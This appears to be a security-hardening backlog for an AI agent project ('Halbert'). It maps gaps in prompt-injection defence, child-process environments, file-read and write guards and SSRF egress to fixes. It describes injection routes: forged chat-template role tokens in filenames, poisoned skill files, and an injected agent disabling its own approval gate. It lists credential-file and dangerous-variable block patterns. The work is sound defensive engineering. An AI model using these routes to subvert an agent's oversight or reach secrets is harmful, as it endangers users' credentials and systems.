- **Durable undo with an operator surface** (HM14-cli-ops-lifecycle-M4 verifier-added) — origin `hermes_cli/checkpoints.py:1-4, 29-215`. Halbert: `somatic/checkpoints.py:26-50` is an in-memory LIFO of 50 that dies with the process. Task: decide whether undo is a durable promise (founder decision F-A6); if so persist content-addressed under the data dir with retention + size caps and a status/prune surface. Effort M.
- **Destructive-cleanup helper: unsafe-target guard, trash-not-delete, dry-run/removal split, exclusive lock; typed removal plans; journaled persona deletion** (OC04-commands-C10, OC09-tasks-system-agent-flows-boards-claws-C11, OC14-agents-second-pass-A-C14) — origin `src/commands/cleanup-utils.ts:61-89, 147-163, 226-254`, `cleanup-plan.ts:29-49`, `src/claws/lifecycle-remove-contract.ts:18-45`, `src/agents/agent-lifecycle-registry.ts:37-146`. Halbert: no trash helper anywhere; the concrete hook the reader missed is `continuity/vault.py:372-376 rebuild()`, which unlinks every `notes/*.md` not in the current plan with no guard, preview or trash; `persona/store.py:243-256 delete_persona` is an unlink after two checks with no journal, id fence or tombstone; `persona/memory_purge.py` rmtrees a persona dir. Task: `utils/destructive.py` (refuse root/home/cwd-containing targets, move to Trash, separate preview entry point, lock) used by vault.rebuild first; journal-before-destruction + id fence for persona delete (the multi-agent tombstone machinery degenerates to "a recreated persona is a new persona"); a `RemovalPlan` shape for the first multi-artifact removal (guest home, MCP server uninstall). Effort M + M(low) + M(medium). Constraint: "never delete" — trash is its mechanical form; `applescript_safety.py:260-263` already treats "empty trash" as permanent.

#### Theme 4 — Instruction sources: skills, context files, MCP metadata and what may reach the prompt

One packet over `skills/loader.py`, `skills/parser.py`, `skills/catalog.py`, `skills/composer.py`, `prompts/agent_prompts.py`, `agents/threads.py`, `mcp/registry.py`. Extends the lifted SKILL.md/catalog work (SK-1/SK-2); coordinate with SK-3/SK-6 in the skills workstream.

- **Strip LLM chat-template special tokens from untrusted text before it reaches a chat-templated local model** (OC12-state-sessions-secrets-security-shared-M1 verifier-added, OC24-docs-qa-security-skills-M2 verifier-added — same mechanism, two units) — origin `src/security/external-content.ts:105-152, 285-288` (one compiled pattern over ChatML, Llama 3/4, Mistral, sentencepiece, harmony, Gemma literals plus `<|reserved_special_token_N|>`; spellings do not overlap so one pass is safe), `:55-72` (per-wrap random boundary id), `:156-200` (lookalike folding for marker detection). Halbert: absent — `prompts/agent_prompts.py:284-286, 309-330, 1241-1270` and `agents/threads.py:148-171` defang only Halbert's own four tags; command stdout, log lines and terminal blocks become `role='system'` rows (`threads.py:1102-1103`) and the primary slots are Ollama endpoints that apply the chat template server-side, so `<|im_start|>system` in a filename forges a role boundary beneath every wrapper. Task: a module-level literal table (data, sorted) and one substitution pass inside `_defang_continuity`/`_fence`/`defang_system_text` and on RAG/web content, with a test that no replacement re-forms a token. Effort S. High.
- **Project-local skill trust gate + scan-on-load + quarantine; provenance-keyed defaults** (HM10-tools-skills-second-pass-C16, OC06-plugins-sdk-M4 verifier-added, OC14-agents-second-pass-A-C19) — origin `agent/skill_utils.py:449-545` (explicit `trusted_project_dirs`; every project-local SKILL.md re-scanned on every load because a git pull can inject into an already-trusted repo, #48974; fail-closed quarantine), `src/plugins/hook-policy-decisions.ts:1-17` (same key, opposite default by origin: bundled opt-out, everything else opt-in), `src/agents/agent-project-settings-snapshot.ts:24-42, 144-173` (shell-affecting keys always sanitised from untrusted sources). Halbert: `skills/loader.py:43-52 default_skill_dirs` still returns `<cwd>/.halbert/skills` and `<cwd>/.claude/skills` unconditionally and is the default for `load_skills` (`:139`) and exported from `skills/__init__.py:18` (the daemon narrowed itself at `:55-68` after loading twelve unrelated Claude Code skills); `parser.py:320-323` defaults `state='trusted'` for any file without a sidecar; `skills/composer.py:191-216 merge_tier`/`merge_budget_appetite` WIDEN a runtime dial from file-local frontmatter while the neighbouring reducers narrow only. Task: make the trusted list the default and cwd an explicit opt-in; carry an origin (builtin | operator-config | project-local | compat) on the parsed Skill and key prompt-injection and allowed_tools-widening to it; sanitise the widening fields (`tier`, `budget_multiplier`) from any non-builtin skill unless marked trusted; content-hash-cached scan on load (needs the scanner below). Effort M + S + S.
- **Scoped deterministic threat scanner for instruction text; block (not warn) on context files; tier by provenance** (HM06-tools-approval-guards-C4, HM02-agent-context-prompt-family-C5, HM16-cron-second-pass-C12, HM10-tools-skills-second-pass-C4; confirmed twice — OpenClaw's `src/skills/security/scanner.ts:220-266` is A13-G5's origin) — origin `tools/threat_patterns.py:1-126` (cumulative all/context/strict scopes; invisible code points checked on RAW content before NFKC; C2 vocabulary, "not bossy English"), `agent/prompt_builder.py:80-93` (a hit blocks the whole file with a visible marker), `tools/cronjob_prompt_scan.py:1-40, 100-144` + `cron/scheduler_prompt.py:267-294` (strict patterns for user-authored text, loose for skill-assembled; the #3968 false-positive incident), `tools/skills_guard.py:26-35, 105-350, 495-509` (4x3 trust x verdict policy; one un-forceable hard block). Halbert: `prompts/safety.py:50-63 InjectionDetector` is 13 flat unscoped patterns; the boundary-safe half exists on the skills path (`skills/parser.py:606-634` byte cap, strict UTF-8, NUL refusal) and the Cf-dropping scrub exists on the HA boundary (`integrations/observation_text.py:60-102`, verified to drop U+200B/U+202E/plane-14 TAGs); `prompts/context.py:428-462 load_project_context` is dead code — scope to the live skills/sidecar path. Task: promote `InjectionDetector` to a scoped scanner (reuse `_structural_scrub`), strictest scope on memory promotion and skill/sidecar load, block-with-marker on instruction files, provenance-tiered on assembled scheduler prompts. Effort M. Constraint (verifier): lift the principle, not a hard-blocking regex list as a security boundary — Halbert's answer remains Tier-2 scrubbing before the model and redaction at the choke point. C4 (trust-tiered install policy) is medium and only worth building as the backend of C16.
- **Skill install/delete/write guards for the SK-6 path** (HM10-tools-skills-second-pass-C3, HM10-tools-skills-second-pass-C11, HM10-tools-skills-second-pass-C7, HM10-tools-skills-second-pass-M4 verifier-added, HM10-tools-skills-second-pass-C2) — origin `tools/skills_hub_install.py:31-57, 60-80, 100-200` (component-by-component symlink refusal; no nesting inside a skill; no category-bucket wipe, #75983; quarantine-then-promote with the destination re-derived inside the promoter and a content-hashed install receipt), `tools/skill_manager_guards.py:105-130` (delete re-validates the rmtree target; Kilo Code #11227), `tools/skill_ledger.py:1-9, 325-390` (JSONL mutation ledger, content-addressed blobs, rollback that fails closed and is itself undoable), `tools/skills_hub_models.py:202-229` (one untrusted-relative-path normaliser: backslash, colon/ADS, absolute, `..`). Halbert: no install/delete path yet; the doctrine exists in `persona/memory_purge.py:26-31, 89-100` and `skills/loader.py:74-110`. Task: write these as required guards in the SK-6 spec now; ship the ledger + rollback with the first agent-created skill. Effort S/S/M/M/S, all medium or low, blocked on SK-6.
- **Catalog availability gating and skill-declared config/secrets** (HM10-tools-skills-second-pass-M2 verifier-added, HM10-tools-skills-second-pass-M5 verifier-added, HM10-tools-skills-second-pass-M6 verifier-added) — origin `agent/prompt_builder.py:1148-1180` (offer-time-only host/runtime gates; `fallback_for` inverse semantics), `agent/skill_utils.py:639-712` (declared config vars with description/default under one namespaced prefix), `tools/skills_tool_setup.py:50-120` (secret prerequisites captured out-of-band; a surface that cannot prompt securely refuses rather than asking in-channel). Halbert: `parser.py:250-271 requires` is parsed and consumed nowhere; `skills/catalog.py:266 render_available_skills` has no gate. Task: evaluate `requires.os/bins/env/config` at render time (offer-time only, so `/<name>` still resolves and explains), gate by `ChannelDeclaration` rather than a platform string, extend the `halbert:` block with described/defaulted config vars, and route unset secret prerequisites to a dashboard secret-entry affordance backed by the credential store — the value never round-trips through the model. Effort M + M + M. These are SKILL-1 features carried here because M6 is a Tier-2 rule; coordinate with SK-3.
- **MCP tool descriptions and results are untrusted metadata** (HM09-tools-mcp-C17 — no verifier verdict; strengthens A17-G5/G6/G7) — origin `tools/mcp_tool_schema.py:13-38` (ten warn-only injection heuristics over descriptions). Halbert: absent under `mcp/`. Task: fold into the A17-G5 sanitiser (`mcp/metadata.py`: override-phrase rewrite, U+E0000-E007F strip, 1,200-char cap) as a logged heuristic, plus the G7 provenance field on `ExecutionResult`. Effort S, low.
- **Scan cache honest about its blind spots** (HM10-tools-skills-second-pass-M8 verifier-added) — origin `tools/skills_tool.py:32-52`. Halbert rebuilds the registry from disk per request (`routes/agent.py:279`). Record: if this is ever cached, key on per-dir max mtime of dir + children plus the disabled set, with a TTL for in-place edits. Effort S, low, no work now.

#### Theme 5 — Third-party process boundary: MCP servers, spawned shells, helper binaries, git

One packet over `mcp/client.py`, `mcp/config.py`, `mcp/health.py`, `streaming/pty.py`, `crypto/storage.py`, `streaming/sandbox.py`, `dashboard/routes/development.py`, `audio/ingress/rtsp_ingress.py`. Composes with A17-G1/G2/G3/G8/G10.

- **Allowlisted environment for every child process — stdio MCP servers, PTYs, subagent shells** (HM09-tools-mcp-C4 — no verifier verdict but A17-G1 confirms it high; OC02-infra-rest-C6, OC05-config-M5 verifier-added, OC22-extensions-local-providers-apps-M2 verifier-added; confirmed twice) — origin `tools/mcp_tool_config.py:53-96` (`_SAFE_ENV_KEYS` baseline + XDG_* + the server's own `env`), `src/infra/host-env-security.ts:4-76` + `host-env-security-policy.json` (318 lines of data: blocked-everywhere NODE_OPTIONS/PYTHONPATH/BASH_ENV/GLIBC_TUNABLES/GIT_EXTERNAL_DIFF/SUDO_ASKPASS..., prefixes DYLD_/LD_/BASH_FUNC_, inherited-vs-override split), `state-dir-dotenv.ts:17-90` (refuse to persist a value that is only `$VAR`), `apps/macos/.../HostEnvSanitizer.swift:1-80` (same JSON generated into Swift with a parity test). Halbert: `mcp/client.py:239` `{**os.environ, **env}` (spot-checked) reaches every third-party server with `HALBERT_MCP_TOKEN` and every other server's token; `streaming/pty.py:289-293` `dict(os.environ)` then `execvpe /bin/sh -c` for agent-pool sessions (`agent_pool.py:83`), subagent shells (`storage_auditor.py:166`) and dashboard terminals (`terminal.py:273, 335`) — the sidecar's environment, where provider credentials live, lands in scrollback that feeds the watched-terminal path. Task: `security/env_policy.py` with the policy as DATA (keys + prefixes, blocked-everywhere vs inherited vs override), an allowlisted baseline for MCP children merged with the server's configured env, the dangerous-var denylist for PTY children, and a test that spawns `env` and asserts no blocked or credential-shaped key appears (seed from `config/secret_correlation.py` and `ingestion/redaction.py`'s vocabulary). Effort S (MCP) + S (PTY). High. Constraint: strengthens "user shells stay but watched" without changing it.
- **Dual-gate MCP server-config scanner and opt-in package malware preflight** (HM09-tools-mcp-C5, HM09-tools-mcp-C6 — no verifier verdict; A17-G3 and A17-G19 cover the same seams) — origin `hermes_cli/mcp_security.py:1-145` (shell interpreter + network egress, shell interpreter + OS-persistence-surface write, IOC substrings; checked at save AND at spawn), `tools/mcp_tool.py:32-64` (OSV lookup before `npx`/`uvx`/`pipx`, fail-open on timeout). Halbert: `mcp/config.py` has no suspicious-shape validation; A17-G3 shows `write_file` to `mcp_config.yml` classifies MEDIUM on macOS and the health monitor launches the new command within one tick. Task: `mcp/config_security.py` called from the dashboard save route and from `StdioTransport` spawn; `get_config_dir()` itself into `SENSITIVE_PATHS` with a CRITICAL classification for writes to `mcp_config.yml`/`being.yml` (A17-G3); OSV preflight only behind a Settings switch because it egresses package names. Effort S + S. Founder decision F-A8 for the OSV switch.
- **Trust-tier gating with discovery-time readOnlyHint/destructiveHint** (HM09-tools-mcp-C3 — no verifier verdict; A17-G8 confirms the gap medium) — origin `tools/mcp_tool.py:473-483`, `mcp_tool_registration.py:36-54`, `mcp_tool_handlers.py:24-47` (untrusted server AND hint != True -> per-call consent; any approval-system exception fails closed). Halbert: `tools/mcp_safety.py:1-60` is a static classifier; annotations are ignored. Task: capture annotations on `MCPToolRef` and let them RAISE (never lower) the effective tier between per-tool and per-server overrides — `destructiveHint == true -> HIGH`. Effort M, medium.
- **Declared-capability + consent-hash registry; capability-widening consent with TOCTOU re-hash** (HM17-plugins-acp-providers-C1, OC06-plugins-sdk-C2; confirmed twice) — origin `hermes_cli/plugin_capabilities.py:1-210` (every capability id maps to a real enforcing gate; consent content-addressed by sha256 of the declared set; re-consent only on the delta), `src/plugins/capability-consent.ts:108-125, 197-221` (after the consent callback yields, the surface is re-read from disk and re-hashed; mismatch throws a fresh review; bounded pending cache). Halbert: `halbert_core/capabilities.py` registers what THIS BODY can do, a different axis; `mcp/config.py:213-260` has risk tiers but no declared set, hash or re-consent; `consent/store.py:411-418` already binds a grant to `text_shown_sha256` — the missing half is re-deriving that digest after the human answers, before `_append_locked`. Task: `CAPABILITY_REGISTRY` mapping ids to the real checks in `executor.py`/`mcp/config.py`, hash the declared surface, record once in the consent ledger, re-hash from the reloaded config before committing. Effort M + M (C2 demoted high -> medium by the verifier). Constraint: pending-review state goes through the existing store, never a parallel table.
- **Tool-surface refresh only at a turn boundary** (HM17-plugins-acp-providers-M1 verifier-added) — origin `acp_adapter/server.py:405-496` (refresh refuses unless the session is the same object, under the runtime lock, not running, and before the first turn). Halbert: `mcp/health.py:359-372` re-bridges from the health tick on the agent's own loop, so the tool list can change between two API calls of one turn and a tool can be deregistered after the model emitted a call for it (`bridge.py:49-60` drops tools whose server left the config). Task: a turn-in-flight signal on ToolExecutor; the monitor defers a pending re-bridge to the next boundary. Effort S. High (churns the cache-stable prefix SK-2 protects).
- **Peer capabilities: declarable at pairing, never in the routed set on the pairing approval alone** (OC17-gateway-second-pass-B-M2 verifier-added) — origin `src/gateway/node-command-policy.ts:24-66, 405-462`. Halbert: `routes/peers.py:222-270` accepts `PairRequest.capabilities` verbatim; `federation/peers_config.py:78-87` includes `terminal` and `sysadmin_tools`, unknown ones kept with a warning (`:384-390`), and `:174-176/:317` route work to any non-revoked peer that advertised the capability — one PIN grants everything permanently. Task: a dangerous tier (terminal, sysadmin_tools, vision) excluded from routing until the owner allows it per peer, plus a per-peer deny applied last, inside the five-axis vocabulary. Effort M. High.
- **Helper binaries resolved from trusted directories, never PATH** (OC02-infra-rest-M1 verifier-added, OC10-media-pipelines-M1 verifier-added — one mechanism from two units) — origin `src/infra/resolve-system-bin.ts:5-28, 106-217`, `path-env.ts:195-214`, `media/ffmpeg-exec.ts:37-64` (strict = OS dirs only; standard appends Homebrew after). Halbert: `crypto/storage.py:204-231, 249-250, 271-300` drives the macOS Keychain and secret-tool by bare name via `shutil.which` — a PATH-hijacked `security` sees the custody key; `streaming/sandbox.py:98-131` probes `bwrap`/`sandbox-exec` by bare name, so the sandbox decision itself is PATH-dependent; ~50 more sites (`utils/ollama.py:49,158`, `vision/ocr.py:69,172`, `tools/schedule_cron.py:85,94`, `rtsp_ingress.py:66`). Task: `utils/system_bin.py resolve_system_bin(name, trust)` and convert the security-critical sites first (strict), then ffmpeg/tesseract/crontab (standard); a test that no resolved path lies outside the fixed list. Effort S. High.
- **Hardened git subprocess environment** (HM07-tools-terminal-files-checkpoints-C2) — origin `tools/working_diff.py:31-41`, `checkpoint_manager.py:182-192`, `hermes_cli/_subprocess_compat.py:52, 230-271` (GIT_CONFIG_GLOBAL/SYSTEM=devnull, NOSYSTEM, drop GIT_DIR/WORK_TREE/INDEX_FILE/ALTERNATE_OBJECT_DIRECTORIES, `--no-ext-diff --no-textconv`, GHSA-7x36-8jrh-v4pw). Halbert: verifier raised medium -> high — `dashboard/routes/development.py:548, 551` run `git -C <path> branch/status` via a bare `subprocess.run` with inherited env against repos discovered by globbing $HOME. Task: `security/git_env.py` (`noninteractive_git_env()`, `harden_git_argv()`) required at every git call site. Effort S.
- **One bound on every ffmpeg/ffprobe child; a stall deadline for the RTSP reader** (OC10-media-pipelines-M4 verifier-added) — origin `media/ffmpeg-limits.ts:1-8`, `ffmpeg-exec.ts:19-75`. Halbert: `rtsp_ingress.py:66-99` spawns ffmpeg on an operator URL with no timeout, duration ceiling or supervision. Effort S, medium.
- **Turn-owned process baseline and epoch-gated reap** (HM12-gateway-rooms-platforms-hooks-M1 verifier-added; pairs with A17-G10's `start_new_session`/`killpg`) — origin `gateway/platforms/api_server.py:544-608`. Halbert: kills only its direct child on its own timeout (`executor.py:902-909`, `applescript_tools.py:90-100`); a nohup'd grandchild outlives the turn untracked. Task: snapshot the child-process set at turn start bound to `continuity/provenance.current_turn`, reap only the delta at turn end or `/stop`, epoch-gated. Effort M, medium. Identity note: the steward should not leave strays on its own host and can then report what it left running.

#### Theme 5b — File-path primitives on the tools the model actually calls (`_read_file`, `_write_file`, the modules route)

Same packet as Theme 5 (P5): all of these edit `ToolExecutor._read_file` (`tools/executor.py:971-1004`), `ToolSafetyFramework._classify_write` (`tools/safety.py:722-739`), `ToolExecutor._write_file` (`executor.py:1023-1109`) or `dashboard/routes/modules.py`. One owner per function, or two packets contend for one file. Constraint throughout: "scope by capability boundary, not filesystem path" — the capability gate decides whether a read or write is allowed; these guards ensure the resolved path is the one that was decided on.

- **Sensitive-file pattern gate before a read returns content; the read classifier is asymmetric today** (OCC01-v2-second-look-C2) — origin `v2/src/permissions/path-check.mjs:9-33, 66-71` (23 credential-shaped patterns — `.env*`, `credentials.json`, `.pem`/`.key`, `id_rsa` family, `.ssh/config`, `.netrc`, `.pgpass`, `.aws/credentials`, `.docker/config.json`, `secrets.*`, `.npmrc`, `.pypirc`, kubeconfig — tested against both the resolved path and its basename; reads blocked, not only writes), `v2/test/test.mjs:1387-1413`. Halbert: the verifier found the better citation — `safety.py:451-458 _classify_builtin` returns SAFE/allowed/"Read-only operation" for `read_file`/`cat`/`read_config` with no path inspection, while `_classify_write` (`:722-732`) DOES walk `SENSITIVE_PATHS`; `_read_file` itself checks only exists/isfile/1 MB. So `~/.ssh/id_rsa`, `.aws/credentials` and `.env` read straight into model context. Task: port the pattern table, apply it to the READ branch of the classifier and in `_read_file` before `open()`, fail closed (deterministic refusal, as Tier 2 does). Effort S. High.
- **fd-pinned bounded read with a non-alarming failure taxonomy; windowed reads with binary and directory detection** (OC01-infra-approvals-devices-backup-C7, OCC01-v2-second-look-M3 verifier-added) — origin `src/infra/boundary-file-read.ts:33-112` (the primitives come from `@openclaw/fs-safe` 0.8.5, not readable in-repo — the verifier's caveat; what this repo holds is the ENOENT/ENOTDIR-vs-ELOOP split and "reporting an ordinary missing file as an escape sends operators hunting a security incident that never happened"), `boundary-path.ts:13-32`, `v2/src/tools/read.mjs:29-34, 44-46, 55-110` (null byte in the first 8 KB -> "binary file, cannot display"; a directory -> a redirect to list it; `offset`/`limit` with a `[File has N lines total. Showing X-Y]` footer). Halbert: verifier corrected absent -> partial — symlink-escape refusal exists for skills (`skills/loader.py:85-113`) and resolved containment in `persona/memory_purge.py:88-113`, but `_read_file` does expanduser + abspath then four separate path-based syscalls (`exists`, `isfile`, `getsize`, `open`), so the file measured is not provably the file read; it raises `File too large (max 1MB)` with no pagination and opens with no binary check, so a 2 MB log is unreadable and a binary file surfaces as a raw `UnicodeDecodeError`. Task: open once, `fstat` the descriptor, read a bounded window from it; split `FileNotFoundError` from a `BoundaryViolationError`; `offset`/`limit` + total-lines footer with the size cap moved to the window; null-byte detection; directory redirect. Effort M + S. Verifier framing: "root-scoped" is the wrong frame for Halbert; lift the fd pinning and the taxonomy, not a filesystem root.
- **Write guards resolve the path before matching, name credential FILES, always-ask on instruction files, refuse the tree's own config** (HM17-plugins-acp-providers-C8, HM07-tools-terminal-files-checkpoints-C11, HM07-tools-terminal-files-checkpoints-C10, OC15-agents-second-pass-B-C9; confirmed twice — Hermes write guards and OpenClaw sandbox denylist) — origin `acp_adapter/edit_approval.py:40, 143-158` (`SENSITIVE_AUTO_APPROVE_NAMES` always asks even under an autonomous policy; containment via `Path.resolve(strict=False).is_relative_to()`, which follows the macOS `/private/tmp` symlink), `tools/file_tools_write_guards.py:17-25, 79-95` (narrow prefixes — `/private/var/db/`, `/private/var/root/`, never a blanket `/private/var/` because `$TMPDIR` realpaths there; a hard refusal of the agent's OWN resolved config file so a prompt-injected agent cannot disable its own approval gate), `:99-235` (`agents.md`/`claude.md`/`soul.md`/`.cursorrules` matched on BOTH the normalised path and its realpath; always asks, never auto-approved, one operation only, BLOCKED when no human channel exists — ported from Roo-Code, symlink lesson #41351), `src/agents/sandbox/validate-sandbox-security.ts:22-48` (`/etc`, `/proc`, `/sys`, `/dev`, `/root`, `/boot`, `/run`, docker.sock; `~/.aws .cargo .config .docker .gnupg .netrc .npm .ssh` — "local-trusted config, protect against foot-guns"). Halbert: verifier corrected all four to partial — `safety.py:723-739 _classify_write` walks `SENSITIVE_PATHS` (`:326-338`: `/etc/ /boot/ /usr/ /var/ /root/ /sys/ /proc/ /dev/`, `~/.ssh/ ~/.gnupg/ ~/.config/`) but (a) it ELEVATES to HIGH+confirm and never refuses — nothing is unwritable; (b) it matches the raw string with `path.startswith(sensitive) or sensitive in path` and no `resolve()` (the file's own comment at `:314-324` records a tilde-spelled path being mis-rated); (c) the set is directory-only, so `./.env`, `./id_rsa`, `./id_ed25519` outside those dirs classify MEDIUM with no confirmation; (d) no `~/.aws` (named as a live trust concern at `config/roles.py:104-112`), `~/.netrc`, `~/.docker`, `~/.npmrc`, docker socket — `register_host_project.py:108-129` excludes them only on the SourcePrep staging path; (e) no instruction-file rule and no self-config rule — `~/.config/` is in the set for the skills reason at `:322-327`, which the verifier credits as the partial. Task, in one edit of `_classify_write`: resolve (expanduser + realpath) before any match; add credential FILE names that always ask regardless of any future auto-approve policy; add the missing home subpaths and the docker socket; an always-ask, never-remembered, fail-closed-without-a-human rule for `CLAUDE.md`/`AGENTS.md`/`HALBERT.md`-class basenames matched on literal AND realpath; a hard refusal (not HIGH) for Halbert's own resolved `being.yml`/`models.yml`/`mcp_config.yml` — the same set `consent/selfmod.py` fences. Effort S + S + S + S. C8 raised medium -> high by the verifier; C10 is high; C11 and C9 medium. Do NOT port a hard deny at path resolution for `/etc` — a host steward's job is administering `/etc`; elevation to approval is the right shape there.
- **Post-write security guidance appended to the result, warn not block** (HM17-plugins-acp-providers-C3) — origin `plugins/security-guidance/__init__.py:1-131`, `patterns.py:1-40` (a compiled rule table for pickle/yaml.load/torch.load/GitHub-Actions injection/`shell=True`/`child_process.exec`; a path filter gates content rules by extension; default appends a guidance block to the tool RESULT and the model self-corrects; `SECURITY_GUIDANCE_BLOCK` flips it to a pre-write refusal; Apache-2.0, forked from Anthropic's claude-plugins-official). Halbert: `executor.py:1023-1047 _write_file` has `check_before_write` and `record_file_change`, no content scan. Task: port the table with its notice intact (Halbert is GPL-3.0-or-later; Apache-2.0 is inbound-compatible but keeps its notice — route through the licence-policy lane the corpus gate established), wire as a post-write warning with a config kill switch, drop the origin's leading warning emoji (DECISIONS.md:15 no-emoji rule; `display_transport` would carry it to the UI). Effort S, medium.
- **The modules route is a second door: unpoliced, unbounded, unredacted reads of `/etc` and all of `~/.config`; resolve-then-read TOCTOU; narrow the roots** (OC10-media-pipelines-M2 verifier-added, OC10-media-pipelines-C12, OC10-media-pipelines-M3 verifier-added) — origin `src/media/read-capability.ts:32-105` (attaching a file re-enters the SAME `read` capability the read tool is evaluated under, with a bounded reader and a narrowed root list bound to the answer), `local-roots.ts:32-54, 116-119` ("only the spool dir is granted, never the state dir at large"), `src/infra/fs-safe.ts:133-149` via `canvas/serve.runtime.ts:12-26` and `media/store.ts:500-521` (one call binds root, byte cap and symlink policy; "Media path changed during read" is a named error). Halbert: `dashboard/routes/modules.py:41-49 _allowed_roots` grants `/etc`, ALL of `~/.config` (where the API-key store lives, and which `safety.py:337` classifies as elevated-risk) and the staging dir; `:52-69 _resolve_allowed_path` is the only check — `Path(...).expanduser().resolve()` then a root test — and the callers separately `read_text()` at `:127` and `:232` with no byte ceiling: a symlink swapped between check and open is read anyway, and the response never passes the redaction seam or the permission lattice. Task (one task, three ids): route both call sites through the same decision the read tool takes; `utils/safe_read.py` — `O_NOFOLLOW` where available, `fstat`, verify the opened file is inside the root, read at most `max_bytes` from that descriptor; narrow the roots to the specific subdirectories the module fetchers need and write the reason inline; run the response through the redaction choke point. Effort S + S + S. High (M2), medium (C12 raised low -> medium, M3).

#### Theme 6 — Egress: one SSRF guard, redirect re-validation, bounded bodies, outbound secret scan

One packet over a new `halbert_core/net/ssrf_guard.py`, `dashboard/routes/llm.py`, `dashboard/routes/compute.py`, `tools/web_search.py`, `web/search.py`, `federation/fleet_proxy.py`, `agents/peer_tool_proxy.py`, `rag/scrapers/*`, `config/dynamic_prefixes.py`. All six SSRF items describe one choke point and must be built once.

- **Pinned-DNS SSRF guard with per-hop redirect re-validation and a literal-string classifier** (OC02-infra-rest-C1, OC10-media-pipelines-C1, OC13-packages-C1, OCC01-v2-second-look-C1, OC19-extensions-identity-security-ops-C11, OC19-extensions-identity-security-ops-M1 verifier-added, HM10-tools-skills-second-pass-M3 verifier-added, OC22-extensions-local-providers-apps-C12; confirmed twice — Hermes `tools/skills_hub.py:94-130` re-runs `is_safe_url` on every hop) — origin `src/infra/net/ssrf.ts:299-350, 405-415, 479-520, 595-706` (pre-DNS literal block, post-DNS re-check of every resolved address with "reuse the exact same classifier to avoid drift", pinned lookup so redirects cannot repoint DNS), `fetch-guard.ts:53-59, 531, 678-728`, `packages/net-policy/src/ip.ts:66, 231-374` (cloud-metadata IPs, RFC8215 NAT64, every IPv4-in-IPv6 embedding), `v2/src/permissions/ssrf-check.mjs:18-101` (literal-only classifier, no DNS by design), `extensions/vault/vault-secret-ref-resolver.js:140-149, 192-209` (`redirect:'manual'`, origin re-asserted per request), `extensions/ollama/src/provider-models.ts:62-82` (per-request policy pinned to the configured hostname; note the origin allows private-network destinations — its guarantee is "only the host you configured"). Halbert: verifier corrected absent -> partial for every reader who said "no SSRF anywhere" — `routes/llm.py:98-128 is_safe_url` does scheme + metadata-hostname + getaddrinfo-then-classify for cloud providers; but it is validate-then-fetch-separately (classic TOCTOU), every `requests.get/post` at `:515, 603, 637, 690, 702, 720, 751, 765, 800, 823, 845` follows redirects (`allow_redirects` does not appear in the file), and the local-provider branch at `:110-113` returns True unconditionally BEFORE resolution while `proxy_models` (`:505-510`) takes both `url` and `provider` from the same caller body — so `provider='ollama'` bypasses the whole check; `compute.py:37, 218, 293, 331-336` reuses it; `web/search.py:274` and `tools/web_search.py:99-101, 186-188` fetch operator-configured SearXNG with no check and default redirects; `fleet_proxy.py`, the HA host and scraper URLs have nothing. Task: one `net/ssrf_guard.py` — literal classifier (port `ip.ts`, reuse `redaction.py:247-277`'s ipaddress lessons), resolve once, pin the connection to the validated address, follow redirects manually re-running the classifier on every hop with a hop budget, strip everything but a safe-header allowlist across origins; make the local-provider branch resolve and require loopback or an explicitly allowed private host (do not let the caller body choose the branch); replace every call site above. Effort M. High. Founder decision F-A4 (LAN Ollama).
- **Cross-origin redirect header allowlist** (OC02-infra-rest-C7) — origin `src/infra/net/redirect-headers.ts:5-40` (14-entry allowlist). Halbert: the verifier checked the installed libraries — `requests` strips `Authorization` on host change and `httpx` strips `Authorization` + `Cookie`, so the reader's premise was wrong; the real gap is allowlist-vs-denylist: every custom credential header is replayed, and `routes/llm.py:74-89 _cloud_auth_headers` sends `x-api-key`. Task: inside the guard's redirect loop, keep only the allowlist. Effort S, medium.
- **Ambient HTTP(S)_PROXY must be an explicit opt-in** (OC04-commands-C7) — origin `src/commands/doctor-web-fetch-proxy.ts:26-46, 68-110` (a proxy re-resolves DNS after the hostname check; doctor fires only when proxy env is set and the opt-in is off; live TLS probe). Halbert: verifier raised low -> high — Python `requests` honours `HTTP_PROXY` by default with no localhost bypass and `trust_env` appears nowhere in the tree, so `react_agent.py:402-427`'s Ollama POSTs, `peer_conversation_store.py:161`, `register_host_project.py:309-491` are silently rerouted through a third party by one env var — a hole in the SEC-21 "local model traffic is local" guarantee. Task: `trust_env=False` on every local-model/peer session (a shared `Session` factory), an explicit setting to opt in, and a doctor row when proxy env is present but unused. Effort S. High.
- **Bounded response bodies with strict Content-Length, error snippets capped separately** (OC10-media-pipelines-M6 verifier-added, OC13-packages-M2 verifier-added) — origin `link-understanding/runner.ts:85-90`, `media/fetch.ts:268-283, 432`, `packages/media-core/src/read-byte-stream-with-limit.ts:28-83`, `content-length.ts:1-18` (repeated Content-Length must be byte-identical; `05, 5` is a smuggling signal). Halbert: every remote read is unbounded — `routes/llm.py` at 13 sites, `web_search.py:109, 196`, `web/search.py:285, 292, 332`, `dynamic_prefixes.py:102-105`, `peer_conversation_store.py:203`, `model/client.py:1009`. Task: `read_body_capped(resp, max_bytes)` in the guard (Content-Length pre-check, capped streaming read, connection torn down on overflow, small separate cap for error snippets), adopted at every site with per-site caps. Effort S. Medium; same packet as the guard.
- **Outbound URL/query secret-pattern guard before egress** (HM08-tools-browser-web-media-voice-C8) — origin `tests/tools/test_browser_secret_exfil.py:18-49` (two-tier: stricter for cloud backends). Halbert: verifier raised low -> medium — `web_search.py:16` sends the agent-composed query straight to DuckDuckGo/SearXNG and nothing scrubs a tool's outbound ARGUMENTS, so a token read from a config file and then searched for egresses. Task: scan agent-composed URLs/query strings with the existing redaction pattern set before any request. Effort S.
- **Link-detection three-gate shape** (OC10-media-pipelines-C2) — origin `src/link-understanding/detect.ts:8-71`, `defaults.ts:2-5` (strip markdown links, extract bare URLs, SSRF-filter, cap at 3). Halbert has no link-fetch feature; demoted medium -> low. Bundle with the guard when a fetch-a-link capability lands; do not copy `format.ts:11-15`, which concatenates fetched text with no untrusted delimiter.
- **ReDoS guard on externally-sourced patterns** (OC12-state-sessions-secrets-security-shared-C8) — origin `src/security/safe-regex.ts:36, 200-357`, `config-regex.ts:39-52`. Halbert: `config/dynamic_prefixes.py:135-141` compiles remotely fetched patterns with only `except re.error`; unwired today (verifier demoted to low). Attach as a note to whoever wires it: nested-quantifier rejection plus bounded input per scan.

#### Theme 7 — Secrets: feed the registry, normalise input, reference not value, seal when needed

